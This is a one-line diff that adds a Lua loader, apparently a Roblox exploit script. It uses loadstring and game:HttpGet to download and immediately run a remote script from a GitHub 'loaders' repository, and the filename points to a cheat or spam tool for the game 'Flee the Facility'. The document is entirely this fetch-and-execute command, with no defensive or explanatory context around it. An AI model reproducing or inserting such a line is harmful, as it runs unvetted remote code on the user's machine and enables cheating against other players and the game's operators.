@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/flee-the-facility-spam7-e3phyouqoaozh0.lua"))()
